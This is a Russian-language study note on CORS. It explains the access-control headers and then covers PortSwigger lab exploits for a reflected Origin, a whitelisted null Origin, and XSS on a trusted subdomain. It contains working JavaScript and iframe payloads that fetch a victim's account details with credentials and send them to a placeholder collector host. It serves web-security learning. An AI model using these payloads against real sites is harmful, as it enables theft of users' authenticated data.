# Введение 

>**Cross-origin Resource Sharing** - технология современных браузеров, которая позволяет предоставить веб-страницам доступ к ресурсам другого домена.

> **CORS** сравнивает **схему** (протокол передачи данных), **порт** и **домен верхнего уровня.** 
###### Acess-Control-Alow-Origin
Поле, отвечающее за доверенные веб-домены. Если оно настроено неправильно - например подставляется динамически, то это будет уязвимостью.
> Принимает 3 значения: **\***, **\<origin>**, **null**.
###### Acess-Control-Alow-Credentials
Позволяет передавать **cookie** в значении **true** или запрещает в - **false**.
Если сервер настроен с подстановочным знаком " **\*** " в качестве значения заголовка **Acess-Control-Alow-Origin**, то использование учётных данных не допускается.

###### Acess-Control-Alow-Methods
Указывает допустимые для запроса методы: PUT, POST, OPTIONS.

###### Acess-Control-Alow-Headers
Указывает дополнительные разрешённые заголовки в запросе.

###### Acess-Control-Alow-Credentials
сообщает браузерам, разрешает ли сервер кросс-оригинальные HTTP-запросы, содержащие учетные данные.

###### Acess-Control-Max-Age: \<delta-seconds>
Количество секунд, на которое запрос может быть кеширован. Максимальное значение в Firefox составляет [24 часа](https://dxr.mozilla.org/mozilla-central/rev/7ae377917236b7e6111146aa9fb4c073c0efc7f4/netwerk/protocol/http/nsCORSListenerProxy.cpp#1131) (86400 секунд), в Chromium [10 минут](https://cs.chromium.org/chromium/src/services/network/public/cpp/cors/preflight_result.cc?rcl=43ab0ff8fdcf3a10a89c4d0d0421f461967f2bd5&l=36) (600 секунд). Chromium также определяет значение по умолчанию [5](https://cs.chromium.org/chromium/src/services/network/public/cpp/cors/preflight_result.cc?rcl=43ab0ff8fdcf3a10a89c4d0d0421f461967f2bd5&l=26) секунд. Значение **-1** отменяет кеширование, отправляя предзапрос перед каждым запросом.

### Pre-fight Requests
>![[Pre-fight Requests.png]]
# PortSwigger статья
https://portswigger.net/web-security/cors#what-is-cors-cross-origin-resource-sharing
# Уязвимости
>![[CORS уязвимости.png]]

### CORS при динамической подстановки значения Acess-Control-Alow-Origin
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
Если в значение ответа сервера **Acess-Control-Alow-Origin** динамически подставляется значение запроса **Origin**, то можно использовать **exploit сервер** со следующим пэйлоадом, чтобы получить данные пользователя:

```javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://domain-A/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        var all = this.responseText;
        fetch('https://COLLABORATOR.oastify.com', { method: 'POST', mode: 'no-cors', body: all });
    };
</script>
```

### CORS: Неправильный парсинг заголовка Origin
https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
Можно попытаться подставить заголовок **Origin: null** и на **exploit** сервере использовать **iframe**. Если работает заголовок **Origin: null**, то может отработать iframe, ведь он по умолчанию подставляет заголовок Origin: null:
```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://domain-A/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        var all = this.responseText;
        fetch('https://COLLABORATOR.oastify.com', { method: 'POST', mode: 'no-cors', body: all });
    };
</script>"</iframe>
```
Или если сайт, например, готов принимать только **Origin: normal-website.com**, но неправильно проверяет стоку, хакер может попытаться зарегистрировать домен **hackersnormal-website.com** или **normal-website.com.evil-user.net** и отправить запрос с него.

### XSS через доверительные отношения CORS
Даже "правильно" настроенный CORS устанавливает доверительные отношения между двумя источниками. Если сайт доверяет источнику, который уязвим для межсайтового скриптинга (XSS), то злоумышленник может использовать XSS для внедрения JavaScript, который использует CORS для получения конфиденциальной информации с сайта, доверяющего уязвимому приложению.
https://portswigger.net/web-security/cors/lab-breaking-https-attack
Пусть существует уязвимый к XSS ресурс через query параметры: **stock.domain-A.com**, и он является доверенным для **domain-A.com** через **Origin**.
В таком случае мы может использовать на **exploit** сервере следующие нагрузки:
```javascript 
<script> document.location="http://stock.domain-A.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://domain-A/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```
или возьмём ранее созданный пэйлоад:
```javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://domain-A/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        var all = this.responseText;
        fetch('https://COLLABORATOR.oastify.com', { method: 'POST', mode: 'no-cors', body: all });
    };
</script>
```
вырежем `\n` и подставим в `document.location="http://stock.domain-A.com/?productId=...&storeId=1`:
```javascript
<script>
    document.location="http://stock.domain-A.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://domain-A/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {var all = this.responseText; fetch('https://COLLABORATOR', {method: 'POST', mode: 'no-cors', body: all })};%3c/script>&storeId=1"
</script>
```
или в URL кодировки вместо использования **`%3c/script>`**.